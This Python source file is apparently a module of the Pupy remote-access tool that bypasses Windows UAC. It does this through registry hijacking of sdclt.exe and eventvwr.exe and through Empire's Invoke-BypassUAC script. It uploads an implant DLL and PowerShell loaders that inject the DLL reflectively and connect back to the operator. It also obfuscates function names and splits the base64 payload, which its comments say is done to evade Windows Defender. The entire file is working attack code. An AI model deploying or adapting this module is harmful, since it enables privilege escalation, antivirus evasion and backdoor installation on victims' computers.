# -*- coding: utf-8 -*-
#Author: @bobsecq
#Contributor(s):

import os, logging
import platform
import pupygen
from rpyc.utils.classic import upload
import base64
from tempfile import gettempdir, _get_candidate_names
import subprocess
import re, time
import random, string
from pupylib.utils.rpyc_utils import redirected_stdo

ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..', '..'))

class bypassuac():

    def __init__(self, module, rootPupyPath):
        self.module = module
        self.module.client.load_package("pupwinutils.bypassuac_remote")

        #Remote paths
        remoteTempFolder, systemRoot = self.module.client.conn.modules["pupwinutils.bypassuac_remote"].get_env_variables()

        self.invokeReflectivePEInjectionRemotePath = "{temp}\\{random}{ext}".format(temp=remoteTempFolder, random=next(_get_candidate_names()), ext='.txt')
        self.mainPowershellScriptRemotePath = "{temp}\\{random}{ext}".format(temp=remoteTempFolder, random=next(_get_candidate_names()), ext='.ps1')
        self.pupyDLLRemotePath = "{temp}\\{random}{ext}".format(temp=remoteTempFolder, random=next(_get_candidate_names()), ext='.txt')
        self.invokeBypassUACRemotePath = "{temp}\\{random}{ext}".format(temp=remoteTempFolder, random=next(_get_candidate_names()), ext='.ps1')

        #Adding obfuscation on ps1 main function
        self.bypassUAC_random_name = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(7))
        self.reflectivePE_random_name = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(7))

        #Define Local paths
        self.pupyDLLLocalPath = os.path.join(gettempdir(),'dllFile.txt')
        self.mainPowerShellScriptPrivilegedLocalPath = os.path.join(gettempdir(),'mainPowerShellScriptPrivileged.txt')
        self.invokeReflectivePEInjectionLocalPath = os.path.join(rootPupyPath,"pupy", "external", "PowerSploit", "CodeExecution", "Invoke-ReflectivePEInjection.ps1")
        self.invokeBypassUACLocalPath = os.path.join(rootPupyPath, "pupy", "external", "Empire", "privesc", "Invoke-BypassUAC.ps1")

    def bypassuac_through_appPaths(self):
        '''
        Performs an UAC bypass attack by using app Paths + sdclt.exe (Wind10 Only): Thanks to enigma0x3 (https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/).
        '''
        self.module.info('Running app Paths method for bypassing UAC...')
        if '64' in self.module.client.desc['os_arch']:
            force_x86_dll = False
        else:
            force_x86_dll = True
        self.module.info('Uploading temporary files')
        self.uploadPupyDLL(force_x86_dll=force_x86_dll)
        self.uploadPowershellScripts()
        files_to_delete=[self.invokeReflectivePEInjectionRemotePath, self.mainPowershellScriptRemotePath, self.pupyDLLRemotePath]
        self.module.info('Altering the registry')
        self.module.client.conn.modules["pupwinutils.bypassuac_remote"].registry_hijacking_appPath(self.mainPowershellScriptRemotePath, files_to_delete)

        self.module.success("Waiting for a connection from the DLL (take few seconds, 1 min max)...")
        self.module.success("If nothing happened, try to migrate to another process and try again.")


    def bypassuac_through_eventVwrBypass(self):
        #   '''
        #   Based on Invoke-EventVwrBypass, thanks to enigma0x3 (https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/)
        #   '''

        # On a Windows 10 "C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe" does not exist, we cannot force to use a x64 bit powershell interpreter
        # The pupy dll upload will be a 32 bit
        self.module.info('Running eventVwr method for bypassing UAC...')
        if '64' in self.module.client.desc['proc_arch']:
            upload_x86_dll = False
        else:
            upload_x86_dll = True
        self.module.info('Uploading temporary files')
        self.uploadPupyDLL(force_x86_dll=upload_x86_dll)
        self.uploadPowershellScripts()
        files_to_delete=[self.invokeReflectivePEInjectionRemotePath, self.mainPowershellScriptRemotePath, self.pupyDLLRemotePath]
        self.module.info('Altering the registry')
        self.module.client.conn.modules["pupwinutils.bypassuac_remote"].registry_hijacking_eventvwr(self.mainPowershellScriptRemotePath, files_to_delete)

        self.module.success("Waiting for a connection from the DLL (take few seconds)...")
        self.module.success("If nothing happened, try to migrate to another process and try again.")

    def bypassuac_through_powerSploitBypassUAC(self):
        '''
        Performs an UAC bypass attack by using the powersloit UACBypass script (wind7 to 8.1)
        '''
        #Constants
        self.module.info('Running powersloit UACBypass method for bypassing UAC...')
        bypassUACcmd = "{InvokeBypassUAC} -Command 'powershell.exe -ExecutionPolicy Bypass -file {mainPowershell} -Verbose'".format(InvokeBypassUAC=self.bypassUAC_random_name, mainPowershell=self.mainPowershellScriptRemotePath)
        self.module.info('Uploading temporary files')
        self.uploadPowershellScripts()
        self.uploadPupyDLL()

        content = ''
        with open(self.invokeBypassUACLocalPath) as script:
            content = script.read()

        content = re.sub('Write-Verbose ', 'Write-Output ', content, flags=re.I)
        content = re.sub('Invoke-BypassUAC', self.bypassUAC_random_name, content, flags=re.I)

        logging.debug("Starting BypassUAC script with the following cmd: {0}".format(bypassUACcmd))
        self.module.info('Starting the UAC Bypass process')

        powershell = self.module.client.conn.modules['powershell']

        output, rest = powershell.call('bypassuac', bypassUACcmd, content=content, try_x64=True)
        if output:
            self.module.log(output)

        if rest:
            self.module.error(rest)

        if "DLL injection complete!" in output:
            self.module.success("UAC bypassed")
        else:
            self.module.warning("Impossible to know what's happened remotely. You should active debug mode.")

        #Clean tmp files
        tmp_files = [self.invokeReflectivePEInjectionRemotePath, self.mainPowershellScriptRemotePath, self.invokeBypassUACRemotePath, self.pupyDLLRemotePath]
        logging.debug("Deleting temporary files")
        self.module.client.conn.modules["pupwinutils.bypassuac_remote"].deleteTHisRemoteFile(tmp_files)

        #...
        self.module.success("Waiting for a connection from the DLL (take few seconds)...")
        self.module.success("If nothing happened, try to migrate to another process and try again.")

    def uploadPowershellScripts(self):
        '''
        Upload main powershell script and invokeReflectivePEInjection script
        '''
        mainPowerShellScriptPrivileged = """
        cat {invoke_reflective_pe_injection} | Out-String  | iex
        cat {pupy_dll} | Out-String  | iex
        {InvokeReflectivePEInjection} -PEBytes $PEBytes -ForceASLR
        """.format(invoke_reflective_pe_injection=self.invokeReflectivePEInjectionRemotePath, pupy_dll=self.pupyDLLRemotePath, InvokeReflectivePEInjection=self.reflectivePE_random_name)

        logging.info("Creating the Powershell script in %s locally"%(self.mainPowerShellScriptPrivilegedLocalPath))
        with open(self.mainPowerShellScriptPrivilegedLocalPath, 'w+') as w:
            w.write(mainPowerShellScriptPrivileged)

        logging.info("Uploading powershell code for DLL injection in {0}".format(self.invokeReflectivePEInjectionRemotePath))
        content = re.sub("Invoke-ReflectivePEInjection", self.reflectivePE_random_name, open(self.invokeReflectivePEInjectionLocalPath).read(), flags=re.I)
        tmp_file = os.path.join(gettempdir(),'reflective_pe.txt')
        with open(tmp_file, 'w+') as w:
            w.write(content)
        upload(self.module.client.conn, tmp_file, self.invokeReflectivePEInjectionRemotePath)
        logging.info("Uploading main powershell script executed by BypassUAC in {0}".format(self.mainPowershellScriptRemotePath))
        upload(self.module.client.conn, self.mainPowerShellScriptPrivilegedLocalPath, self.mainPowershellScriptRemotePath)

    def uploadPupyDLL(self, force_x86_dll=False):
        '''
        Upload pupy dll as a txt file
        '''
        try:
            res=self.module.client.conn.modules['pupy'].get_connect_back_host()
            host, port = res.rsplit(':',1)
            logging.info("Address configured is %s:%s for pupy dll..."%(host,port))
        except:
            logging.info("Address configured is %s for pupy dll..."%(res))

        logging.info("Looking for process architecture...")
        logging.info("force x86 is %s"%force_x86_dll)
        conf = self.module.client.get_conf()
        if "64" in self.module.client.desc["os_arch"] and not force_x86_dll:
            dllbuff, tpl, _ = pupygen.generate_binary_from_template(conf, 'windows', arch='x64', shared=True)
        else:
            dllbuff, tpl, _ = pupygen.generate_binary_from_template(conf, 'windows', arch='x86', shared=True)

        logging.info("Creating the pupy dll (%s) in %s locally"%(tpl, self.pupyDLLLocalPath))
        with open(self.pupyDLLLocalPath, 'w+') as w:
            #the following powershell line in a txt file is detected by Windows defender
            #w.write('$PEBytes = [System.Convert]::FromBase64String("%s")'%(base64.b64encode(dllbuff)))
            #To bypass antivirus detection:
            dllbuffEncoded = base64.b64encode(dllbuff)
            w.write('$p1="{0}";$p2="{1}";$PEBytes=[System.Convert]::FromBase64String($p1+$p2)'.format(dllbuffEncoded[0:2], dllbuffEncoded[2:]))

        logging.info("Uploading pupy dll {0} to {1}".format(self.pupyDLLLocalPath, self.pupyDLLRemotePath))
        upload(self.module.client.conn, self.pupyDLLLocalPath, self.pupyDLLRemotePath)
